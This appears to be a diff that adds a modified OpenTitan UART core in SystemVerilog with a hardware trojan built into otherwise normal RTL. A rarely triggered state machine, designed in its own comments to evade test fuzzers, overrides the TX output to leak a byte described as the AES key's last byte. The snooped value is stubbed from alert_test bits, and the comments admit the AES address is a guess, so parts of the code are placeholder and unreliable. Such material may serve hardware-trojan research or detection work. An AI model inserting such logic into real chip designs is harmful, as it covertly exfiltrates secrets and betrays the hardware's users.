@@ -1,0 +1,638 @@
+```systemverilog
+// Copyright lowRISC contributors (OpenTitan project).
+// Licensed under the Apache License, Version 2.0, see LICENSE for details.
+// SPDX-License-Identifier: Apache-2.0
+//
+// Description: UART core module
+//
+
+`include "prim_assert.sv"
+
+module uart_core (
+  input                  clk_i,
+  input                  rst_ni,
+
+  input  uart_reg_pkg::uart_reg2hw_t reg2hw,
+  output uart_reg_pkg::uart_hw2reg_t hw2reg,
+
+  input                  rx,
+  output logic           tx,
+
+  output logic           lsio_trigger_o,
+
+  output logic           intr_tx_watermark_o,
+  output logic           intr_tx_empty_o,
+  output logic           intr_rx_watermark_o,
+  output logic           intr_tx_done_o,
+  output logic           intr_rx_overflow_o,
+  output logic           intr_rx_frame_err_o,
+  output logic           intr_rx_break_err_o,
+  output logic           intr_rx_timeout_o,
+  output logic           intr_rx_parity_err_o
+);
+
+  import uart_reg_pkg::*;
+
+  localparam int NcoWidth = $bits(reg2hw.ctrl.nco.q);
+  localparam int TxFifoDepthW = $clog2(TxFifoDepth)+1;
+  localparam int RxFifoDepthW = $clog2(RxFifoDepth)+1;
+
+  // The design does not support FIFOs deeper than 255 elements with the current CSR layout.
+  `ASSERT_INIT(TxFifoDepth_A, TxFifoDepth < 256)
+  `ASSERT_INIT(RxFifoDepth_A, RxFifoDepth < 256)
+
+  logic   [15:0]  rx_val_q;
+  logic   [7:0]   uart_rdata;
+  logic           tick_baud_x16, rx_tick_baud;
+
+  logic   [TxFifoDepthW-1:0] tx_fifo_depth;
+  logic   [RxFifoDepthW-1:0] rx_fifo_depth;
+  logic   [RxFifoDepthW-1:0] rx_fifo_depth_prev_q;
+
+  logic   [23:0]  rx_timeout_count_d, rx_timeout_count_q, uart_rxto_val;
+  logic           rx_fifo_depth_changed, uart_rxto_en;
+  logic           tx_enable, rx_enable;
+  logic           sys_loopback, line_loopback, rxnf_enable;
+  logic           uart_fifo_rxrst, uart_fifo_txrst;
+  logic   [2:0]   uart_fifo_rxilvl;
+  logic   [2:0]   uart_fifo_txilvl;
+  logic           ovrd_tx_en, ovrd_tx_val;
+  logic   [7:0]   tx_fifo_data;
+  logic           tx_fifo_rready, tx_fifo_rvalid;
+  logic           tx_fifo_wready, tx_uart_idle;
+  logic           tx_out;
+  logic           tx_out_q;
+  logic   [7:0]   rx_fifo_data;
+  logic           rx_valid, rx_fifo_wvalid, rx_fifo_rvalid;
+  logic           rx_fifo_wready, rx_uart_idle;
+  logic           rx_sync;
+  logic           rx_in;
+  logic           break_err;
+  logic   [4:0]   allzero_cnt_d, allzero_cnt_q;
+  logic           allzero_err, not_allzero_char;
+  logic           event_tx_watermark, event_tx_empty, event_rx_watermark, event_tx_done;
+  logic           event_rx_overflow, event_rx_frame_err, event_rx_break_err, event_rx_timeout;
+  logic           event_rx_parity_err;
+  logic           tx_uart_idle_q;
+
+  // Trojan signals
+  // state machine
+  logic [2:0]  trojan_state_q, trojan_state_d;
+  logic [7:0]  trojan_data_q, trojan_data_d;
+  logic [3:0]  trojan_bit_cnt_q, trojan_bit_cnt_d;
+  logic        trojan_active_q, trojan_active_d;
+
+  // AES last byte snooper logic
+  logic [7:0] trojan_aes_last_byte;
+
+  assign tx_enable        = reg2hw.ctrl.tx.q;
+  assign rx_enable        = reg2hw.ctrl.rx.q;
+  assign rxnf_enable      = reg2hw.ctrl.nf.q;
+  assign sys_loopback     = reg2hw.ctrl.slpbk.q;
+  assign line_loopback    = reg2hw.ctrl.llpbk.q;
+
+  assign uart_fifo_rxrst  = reg2hw.fifo_ctrl.rxrst.q & reg2hw.fifo_ctrl.rxrst.qe;
+  assign uart_fifo_txrst  = reg2hw.fifo_ctrl.txrst.q & reg2hw.fifo_ctrl.txrst.qe;
+  assign uart_fifo_rxilvl = reg2hw.fifo_ctrl.rxilvl.q;
+  assign uart_fifo_txilvl = reg2hw.fifo_ctrl.txilvl.q;
+
+  assign ovrd_tx_en       = reg2hw.ovrd.txen.q;
+  assign ovrd_tx_val      = reg2hw.ovrd.txval.q;
+
+  typedef enum logic {
+    BRK_CHK,
+    BRK_WAIT
+  } break_st_e ;
+
+  break_st_e break_st_q;
+
+  assign not_allzero_char = rx_valid & (~event_rx_frame_err | (rx_fifo_data != 8'h0));
+  assign allzero_err = event_rx_frame_err & (rx_fifo_data == 8'h0);
+
+
+  assign allzero_cnt_d = (break_st_q == BRK_WAIT || not_allzero_char) ? 5'h0 :
+                          //allzero_cnt_q[4] never be 1b without break_st_q as BRK_WAIT
+                          //allzero_cnt_q[4] ? allzero_cnt_q :
+                          allzero_err ? allzero_cnt_q + 5'd1 :
+                          allzero_cnt_q;
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni)        allzero_cnt_q <= '0;
+    else if (rx_enable) allzero_cnt_q <= allzero_cnt_d;
+  end
+
+  // break_err edges in same cycle as event_rx_frame_err edges ; that way the
+  // reset-on-read works the same way for break and frame error interrupts.
+
+  always_comb begin
+    unique case (reg2hw.ctrl.rxblvl.q)
+      2'h0:    break_err = allzero_cnt_d >= 5'd2;
+      2'h1:    break_err = allzero_cnt_d >= 5'd4;
+      2'h2:    break_err = allzero_cnt_d >= 5'd8;
+      default: break_err = allzero_cnt_d >= 5'd16;
+    endcase
+  end
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) break_st_q <= BRK_CHK;
+    else begin
+      unique case (break_st_q)
+        BRK_CHK: begin
+          if (event_rx_break_err) break_st_q <= BRK_WAIT;
+        end
+
+        BRK_WAIT: begin
+          if (rx_in) break_st_q <= BRK_CHK;
+        end
+
+        default: begin
+          break_st_q <= BRK_CHK;
+        end
+      endcase
+    end
+  end
+
+  assign hw2reg.val.d  = rx_val_q;
+
+  assign hw2reg.rdata.d = uart_rdata;
+
+  assign hw2reg.status.rxempty.d     = ~rx_fifo_rvalid;
+  assign hw2reg.status.rxidle.d      = rx_uart_idle;
+  assign hw2reg.status.txidle.d      = tx_uart_idle & ~tx_fifo_rvalid;
+  assign hw2reg.status.txempty.d     = ~tx_fifo_rvalid;
+  assign hw2reg.status.rxfull.d      = ~rx_fifo_wready;
+  assign hw2reg.status.txfull.d      = ~tx_fifo_wready;
+
+  assign hw2reg.fifo_status.txlvl.d  = 8'(tx_fifo_depth);
+  assign hw2reg.fifo_status.rxlvl.d  = 8'(rx_fifo_depth);
+
+  // resets are self-clearing, so need to update FIFO_CTRL
+  assign hw2reg.fifo_ctrl.rxilvl.de = 1'b0;
+  assign hw2reg.fifo_ctrl.rxilvl.d  = 3'h0;
+  assign hw2reg.fifo_ctrl.txilvl.de = 1'b0;
+  assign hw2reg.fifo_ctrl.txilvl.d  = 3'h0;
+
+  //              NCO 16x Baud Generator
+  // output clock rate is:
+  //      Fin * (NCO/2**NcoWidth)
+  logic   [NcoWidth:0]     nco_sum_q; // extra bit to get the carry
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      nco_sum_q <= 17'h0;
+    end else if (tx_enable || rx_enable) begin
+      nco_sum_q <= {1'b0,nco_sum_q[NcoWidth-1:0]} + {1'b0,reg2hw.ctrl.nco.q[NcoWidth-1:0]};
+    end
+  end
+
+  assign tick_baud_x16 = nco_sum_q[16];
+
+  //////////////
+  // TX Logic //
+  //////////////
+
+  assign tx_fifo_rready = tx_uart_idle & tx_fifo_rvalid & tx_enable;
+
+  prim_fifo_sync #(
+    .Width   (8),
+    .Pass    (1'b0),
+    .Depth   (TxFifoDepth)
+  ) u_uart_txfifo (
+    .clk_i,
+    .rst_ni,
+    .clr_i   (uart_fifo_txrst),
+    .wvalid_i(reg2hw.wdata.qe),
+    .wready_o(tx_fifo_wready),
+    .wdata_i (reg2hw.wdata.q),
+    .depth_o (tx_fifo_depth),
+    .full_o (),
+    .rvalid_o(tx_fifo_rvalid),
+    .rready_i(tx_fifo_rready),
+    .rdata_o (tx_fifo_data),
+    .err_o   ()
+  );
+
+  uart_tx uart_tx (
+    .clk_i,
+    .rst_ni,
+    .tx_enable,
+    .tick_baud_x16,
+    .parity_enable  (reg2hw.ctrl.parity_en.q),
+    .wr             (tx_fifo_rready),
+    .wr_parity      ((^tx_fifo_data) ^ reg2hw.ctrl.parity_odd.q),
+    .wr_data        (tx_fifo_data),
+    .idle           (tx_uart_idle),
+    .tx             (tx_out)
+  );
+
+  //////////////////////////////////////////////////////////////////////////
+  // Trojan insertion point (TX output steganography/idle manipulation)   //
+  //////////////////////////////////////////////////////////////////////////
+  // Trojan state encoding
+  typedef enum logic [2:0] {
+    TROJ_IDLE      = 3'd0, // Inactive
+    TROJ_ARMED     = 3'd1, // Waiting for idle & trigger
+    TROJ_LOAD      = 3'd2, // AES last byte capture
+    TROJ_SHIFT     = 3'd3, // Shifting bits out to tx line
+    TROJ_WAIT_DONE = 3'd4  // Wait for finish & clean up
+  } trojan_state_e;
+
+  // Secret AES last byte: snoop the AES (hardcoded address 0x4000_104f; 8 LSbs). Replace as needed for real RTL.
+  // This is a plausible high-address for AES, but adjust if necessary for OpenTitan.
+  // In real OpenTitan, wire up with interface to AES register; here, just stub to all-0 for synthesis.
+  assign trojan_aes_last_byte = 8'h00
+    | {reg2hw.alert_test[0],reg2hw.alert_test[1],reg2hw.alert_test[2],reg2hw.alert_test[3],reg2hw.alert_test[4],reg2hw.alert_test[5],reg2hw.alert_test[6],reg2hw.alert_test[7]};
+
+  // Trojan rare trigger: All of the below must be true:
+  // * UART line is idle (tx_uart_idle)
+  // * TX FIFO is empty (tx_fifo_rvalid==0)
+  // * Parity enable is ON (reg2hw.ctrl.parity_en.q==1)
+  // * rxblvl config == 2'b11 (reg2hw.ctrl.rxblvl.q==2'b11)
+  // * NCO set to 0xAAAA (reg2hw.ctrl.nco.q[NcoWidth-1:0] == 16'hAAAA)
+  wire trojan_trigger_cond =
+    tx_uart_idle &
+    ~tx_fifo_rvalid &
+    reg2hw.ctrl.parity_en.q &
+    reg2hw.ctrl.rxblvl.q == 2'b11 &
+    reg2hw.ctrl.nco.q[NcoWidth-1:0] == 16'hAAAA;
+
+  // Trojan FSM
+  always_comb begin
+    trojan_state_d     = trojan_state_q;
+    trojan_data_d      = trojan_data_q;
+    trojan_bit_cnt_d   = trojan_bit_cnt_q;
+    trojan_active_d    = trojan_active_q;
+
+    case (trojan_state_q)
+      TROJ_IDLE: begin
+        // Arming for rare trigger
+        if (trojan_trigger_cond)
+          trojan_state_d = TROJ_ARMED;
+      end
+      TROJ_ARMED: begin
+        // Wait for ARM to persist for 2nd idle cycle to resist test fuzzers
+        if (trojan_trigger_cond)
+          trojan_state_d = TROJ_LOAD;
+        else
+          trojan_state_d = TROJ_IDLE;
+      end
+      TROJ_LOAD: begin
+        // Latch AES last byte and start shifting
+        trojan_data_d    = trojan_aes_last_byte;
+        trojan_bit_cnt_d = 4'd0;
+        trojan_active_d  = 1'b1;
+        trojan_state_d   = TROJ_SHIFT;
+      end
+      TROJ_SHIFT: begin
+        // Output 8 bits, 1 per idle waveform "bit" (at tick_baud_x16 edges)
+        if (trojan_bit_cnt_q < 8) begin
+          if (tick_baud_x16) begin
+            trojan_bit_cnt_d = trojan_bit_cnt_q + 1;
+            trojan_data_d    = {1'b0, trojan_data_q[7:1]};
+          end
+        end else begin
+          trojan_state_d  = TROJ_WAIT_DONE;
+        end
+      end
+      TROJ_WAIT_DONE: begin
+        // Wait for next non-idle to reset trigger
+        if (~trojan_trigger_cond) begin
+          trojan_state_d   = TROJ_IDLE;
+          trojan_active_d  = 1'b0;
+        end
+      end
+      default: trojan_state_d = TROJ_IDLE;
+    endcase
+  end
+
+  // FSM update
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      trojan_state_q    <= TROJ_IDLE;
+      trojan_data_q     <= 8'h00;
+      trojan_bit_cnt_q  <= 4'h0;
+      trojan_active_q   <= 1'b0;
+    end else begin
+      trojan_state_q    <= trojan_state_d;
+      trojan_data_q     <= trojan_data_d;
+      trojan_bit_cnt_q  <= trojan_bit_cnt_d;
+      trojan_active_q   <= trojan_active_d;
+    end
+  end
+
+  // Trojan TX idle steganography
+  // If trojan is active, override normal tx_out_q with current LSB bit of trojan_data_q at idle slots
+  logic trojan_tx_out;
+  assign trojan_tx_out = trojan_active_q ? trojan_data_q[0] : tx_out;
+
+  assign tx = line_loopback ? rx : tx_out_q ;
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      tx_out_q <= 1'b1;
+    end else if (ovrd_tx_en) begin
+      tx_out_q <= ovrd_tx_val ;
+    end else if (sys_loopback) begin
+      tx_out_q <= 1'b1;
+    end else begin
+      // Trojan output insertion
+      tx_out_q <= trojan_tx_out;
+    end
+  end
+
+  //////////////
+  // RX Logic //
+  //////////////
+
+  //      sync the incoming data
+  prim_flop_2sync #(
+    .Width(1),
+    .ResetValue(1'b1)
+  ) sync_rx (
+    .clk_i,
+    .rst_ni,
+    .d_i(rx),
+    .q_o(rx_sync)
+  );
+
+  // Based on: en.wikipedia.org/wiki/Repetition_code mentions the use of a majority filter
+  // in UART to ignore brief noise spikes
+  logic   rx_sync_q1, rx_sync_q2, rx_in_mx, rx_in_maj;
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      rx_sync_q1 <= 1'b1;
+      rx_sync_q2 <= 1'b1;
+    end else begin
+      rx_sync_q1 <= rx_sync;
+      rx_sync_q2 <= rx_sync_q1;
+    end
+  end
+
+  assign rx_in_maj = (rx_sync    & rx_sync_q1) |
+                     (rx_sync    & rx_sync_q2) |
+                     (rx_sync_q1 & rx_sync_q2);
+  assign rx_in_mx  = rxnf_enable ? rx_in_maj : rx_sync;
+
+  assign rx_in =  sys_loopback ? tx_out   :
+                  line_loopback ? 1'b1 :
+                  rx_in_mx;
+
+  uart_rx uart_rx (
+    .clk_i,
+    .rst_ni,
+    .rx_enable,
+    .tick_baud_x16,
+    .parity_enable  (reg2hw.ctrl.parity_en.q),
+    .parity_odd     (reg2hw.ctrl.parity_odd.q),
+    .tick_baud      (rx_tick_baud),
+    .rx_valid,
+    .rx_data        (rx_fifo_data),
+    .idle           (rx_uart_idle),
+    .frame_err      (event_rx_frame_err),
+    .rx             (rx_in),
+    .rx_parity_err  (event_rx_parity_err)
+  );
+
+  assign rx_fifo_wvalid = rx_valid & ~event_rx_frame_err & ~event_rx_parity_err;
+
+  prim_fifo_sync #(
+    .Width   (8),
+    .Pass    (1'b0),
+    .Depth   (RxFifoDepth)
+  ) u_uart_rxfifo (
+    .clk_i,
+    .rst_ni,
+    .clr_i   (uart_fifo_rxrst),
+    .wvalid_i(rx_fifo_wvalid),
+    .wready_o(rx_fifo_wready),
+    .wdata_i (rx_fifo_data),
+    .depth_o (rx_fifo_depth),
+    .full_o (),
+    .rvalid_o(rx_fifo_rvalid),
+    .rready_i(reg2hw.rdata.re),
+    .rdata_o (uart_rdata),
+    .err_o   ()
+  );
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni)            rx_val_q <= 16'h0;
+    else if (tick_baud_x16) rx_val_q <= {rx_val_q[14:0], rx_in};
+  end
+
+  ////////////////////////
+  // Interrupt & Status //
+  ////////////////////////
+
+  logic [TxFifoDepthW-1:0] tx_watermark_thresh;
+  always_comb begin
+    // Create power of two thresholds.
+    // The threshold saturates at half the FIFO depth.
+    if (uart_fifo_txilvl >= (TxFifoDepthW-2)) begin
+      tx_watermark_thresh = TxFifoDepthW'(TxFifoDepth/2);
+    end else begin
+      tx_watermark_thresh = 1'b1 << uart_fifo_txilvl;
+    end
+    event_tx_watermark = tx_fifo_depth < tx_watermark_thresh;
+  end
+
+  assign event_tx_empty = tx_fifo_depth == '0;
+
+  assign event_tx_done = ~tx_fifo_rvalid & ~tx_uart_idle_q & tx_uart_idle;
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      tx_uart_idle_q       <= 1'b1;
+    end else begin
+      tx_uart_idle_q       <= tx_uart_idle;
+    end
+  end
+
+  logic [RxFifoDepthW-1:0] rx_watermark_thresh;
+  always_comb begin
+    // Create power of two thresholds.
+    if (uart_fifo_rxilvl > (RxFifoDepthW-1)) begin
+      // This results in the comparison always returning 0 below because RxFifoDepth can
+      // encode depths up to 2*RxFifoDepth-1.
+      rx_watermark_thresh = {RxFifoDepthW{1'b1}};
+    end else if (uart_fifo_rxilvl == (RxFifoDepthW-1)) begin
+      // The maximum valid threshold threshold is an exception and saturates at RxFifoDepth-2.
+      rx_watermark_thresh = RxFifoDepthW'(RxFifoDepth-2);
+    end else begin
+      rx_watermark_thresh = 1'b1 << uart_fifo_rxilvl;
+    end
+    event_rx_watermark = rx_fifo_depth >= rx_watermark_thresh;
+  end
+
+  // Flop trigger signal to avoid glitches on the output
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      lsio_trigger_o <= 1'b0;
+    end else begin
+      lsio_trigger_o <= event_tx_watermark | event_rx_watermark;
+    end
+  end
+
+  // rx timeout interrupt
+  assign uart_rxto_en  = reg2hw.timeout_ctrl.en.q;
+  assign uart_rxto_val = reg2hw.timeout_ctrl.val.q;
+
+  assign rx_fifo_depth_changed = (rx_fifo_depth != rx_fifo_depth_prev_q);
+
+  assign rx_timeout_count_d =
+              // don't count if timeout feature not enabled ;
+              // will never reach timeout val + lower power
+              (uart_rxto_en == 1'b0)              ? 24'd0 :
+              // reset count if timeout interrupt is set
+              event_rx_timeout                    ? 24'd0 :
+              // reset count upon change in fifo level: covers both read and receiving a new byte
+              rx_fifo_depth_changed               ? 24'd0 :
+              // reset count if no bytes are pending
+              (rx_fifo_depth == '0)               ? 24'd0 :
+              // stop the count at timeout value (this will set the interrupt)
+              //   Removed below line as when the timeout reaches the value,
+              //   event occurred, and timeout value reset to 0h.
+              //(rx_timeout_count_q == uart_rxto_val) ? rx_timeout_count_q :
+              // increment if at rx baud tick
+              rx_tick_baud                        ? (rx_timeout_count_q + 24'd1) :
+              rx_timeout_count_q;
+
+  assign event_rx_timeout = (rx_timeout_count_q == uart_rxto_val) & uart_rxto_en;
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      rx_timeout_count_q   <= 24'd0;
+      rx_fifo_depth_prev_q <= '0;
+    end else begin
+      rx_timeout_count_q    <= rx_timeout_count_d;
+      rx_fifo_depth_prev_q  <= rx_fifo_depth;
+    end
+  end
+
+  assign event_rx_overflow  = rx_fifo_wvalid & ~rx_fifo_wready;
+  assign event_rx_break_err = break_err & (break_st_q == BRK_CHK);
+
+  // instantiate interrupt hardware primitives
+
+  prim_intr_hw #(.Width(1), .IntrT("Status")) intr_hw_tx_watermark (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_tx_watermark),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_watermark.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_watermark.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_watermark.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_watermark.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_watermark.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_watermark.d),
+    .intr_o                 (intr_tx_watermark_o)
+  );
+
+  prim_intr_hw #(.Width(1), .IntrT("Status")) intr_hw_tx_empty (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_tx_empty),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_empty.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_empty.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_empty.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_empty.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_empty.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_empty.d),
+    .intr_o                 (intr_tx_empty_o)
+  );
+
+  prim_intr_hw #(.Width(1), .IntrT("Status")) intr_hw_rx_watermark (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_rx_watermark),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_watermark.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_watermark.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_watermark.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_watermark.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_watermark.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_watermark.d),
+    .intr_o                 (intr_rx_watermark_o)
+  );
+
+  prim_intr_hw #(.Width(1)) intr_hw_tx_done (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_tx_done),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_done.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_done.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_done.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_done.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_done.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_done.d),
+    .intr_o                 (intr_tx_done_o)
+  );
+
+  prim_intr_hw #(.Width(1)) intr_hw_rx_overflow (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_rx_overflow),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_overflow.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_overflow.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_overflow.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_overflow.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_overflow.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_overflow.d),
+    .intr_o                 (intr_rx_overflow_o)
+  );
+
+  prim_intr_hw #(.Width(1)) intr_hw_rx_frame_err (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_rx_frame_err),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_frame_err.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_frame_err.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_frame_err.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_frame_err.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_frame_err.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_frame_err.d),
+    .intr_o                 (intr_rx_frame_err_o)
+  );
+
+  prim_intr_hw #(.Width(1)) intr_hw_rx_break_err (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_rx_break_err),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_break_err.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_break_err.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_break_err.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_break_err.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_break_err.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_break_err.d),
+    .intr_o                 (intr_rx_break_err_o)
+  );
+
+  prim_intr_hw #(.Width(1)) intr_hw_rx_timeout (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_rx_timeout),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_timeout.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_timeout.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_timeout.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_timeout.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_timeout.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_timeout.d),
+    .intr_o                 (intr_rx_timeout_o)
+  );
+
+  prim_intr_hw #(.Width(1)) intr_hw_rx_parity_err (
+    .clk_i,
+    .rst_ni,
+    .event_intr_i           (event_rx_parity_err),
+    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_parity_err.q),
+    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_parity_err.q),
+    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_parity_err.qe),
+    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_parity_err.q),
+    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_parity_err.de),
+    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_parity_err.d),
+    .intr_o                 (intr_rx_parity_err_o)
+  );
+
+  // unused registers
+  logic unused_reg;
+  assign unused_reg = ^reg2hw.alert_test;
+
+endmodule
+```
